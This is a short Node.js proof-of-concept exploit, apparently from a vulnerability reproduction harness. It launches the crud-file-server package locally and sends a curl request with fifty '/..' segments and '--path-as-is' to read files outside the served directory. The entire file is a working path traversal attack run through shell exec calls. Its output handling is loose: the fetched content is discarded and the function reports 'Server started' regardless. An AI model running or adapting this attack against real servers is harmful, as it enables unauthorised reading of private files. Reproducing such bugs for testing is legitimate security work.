const { exec } = require("child_process");
const { sleep } = require("sleep");

function exploitFunction(payload) {
  const path = require("path");

  const genstr = (n) => "/..".repeat(50) + path.resolve(__dirname, payload);
  let server = "node ./node_modules/crud-file-server/bin/crud-file-server -p 8998";
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8998${genstr()}"`;

  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    sleep.sleep(2);

    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack string: ${error}`);
        return;
      }

      return stdout;
    });
  });

  return new Promise((resolve) => {
    setTimeout(() => resolve("Server started"), 1000);
  });
}

module.exports = { exploitFunction };